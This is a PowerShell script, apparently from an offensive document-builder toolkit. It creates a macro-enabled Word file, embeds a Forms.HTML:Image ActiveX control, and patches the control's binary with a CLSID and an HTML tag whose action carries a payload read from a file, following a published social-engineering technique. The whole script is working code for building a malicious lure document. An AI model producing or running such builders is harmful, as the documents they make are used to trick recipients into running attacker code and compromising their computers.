Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

https://www.securify.nl/blog/click-me-if-you-can-office-social-engineering-with-embedded-objects

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $clsid = "5512D112-5CC6-11CF-8D67-00AA00BDCE1D"

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")
    $html = '<x type="image" src="https://securify.nl/blog/SFY20180801/packager.emf" action="aPAYLOADa">'
    $html = $html -replace "aPAYLOADa", $payload

    [void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
    [void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    $shape = $wdDoc.InlineShapes.AddOLEControl("Forms.HTML:Image.1")

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    }

    $tmpfolder = "$env:TEMP\" + [System.Guid]::NewGuid()
    $null = New-Item -Type directory -Path $tmpfolder

    [System.IO.Compression.ZipFile]::ExtractToDirectory("$out.docm", $tmpfolder)
    Remove-Item "$tmpfolder\word\activeX\activeX1.bin"
    $clsid = ([GUID]$clsid).ToByteArray()
    $clsid | Set-Content "$tmpfolder\word\activeX\activeX1.bin" -Encoding Byte
    $html | Add-Content "$tmpfolder\word\activeX\activeX1.bin" -Encoding Unicode

    Remove-Item "$out.docm"
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tmpfolder, "$out.docm")
    Remove-Item $tmpfolder -Force -Recurse

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp
}